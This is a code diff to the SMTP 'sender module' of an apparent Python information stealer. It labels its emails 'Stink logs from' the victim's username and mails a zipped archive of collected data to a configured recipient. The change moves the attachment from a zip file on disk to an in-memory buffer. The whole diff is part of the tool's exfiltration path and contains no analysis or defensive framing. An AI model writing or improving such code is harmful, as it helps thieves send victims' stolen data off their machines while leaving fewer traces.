@@ -1,4 +1,4 @@
-from os import path
+from io import BytesIO
 from smtplib import SMTP
 from getpass import getuser
 from email.message import EmailMessage, Message
@@ -35,10 +35,9 @@ class Smtp(AbstractSender):
         message["To"] = self.__recipient_email
         message["Subject"] = f"Stink logs from {getuser()}"
 
-        with open(path.join(path.dirname(self.__storage_path), rf"{self.__zip_name}.zip"), "rb") as file:
-            message.add_attachment(
-                file.read(), maintype="application", subtype="octet-stream", filename=rf"{self.__zip_name}.zip"
-            )
+        message.add_attachment(
+            self.__data.getvalue(), maintype="application", subtype="octet-stream", filename=rf"{self.__zip_name}.zip"
+        )
 
         return message
 
@@ -60,19 +59,19 @@ class Smtp(AbstractSender):
         server.send_message(message)
         server.quit()
 
-    def run(self, zip_name: str, storage_path: str) -> None:
+    def run(self, zip_name: str, data: BytesIO) -> None:
         """
         Launches the sender module.
 
         Parameters:
         - zip_name [str]: Archive name.
-        - storage_path [str]: Path to storage.
+        - data [BytesIO]: BytesIO object.
 
         Returns:
         - None.
         """
         self.__zip_name = zip_name
-        self.__storage_path = storage_path
+        self.__data = data
 
         try:
 
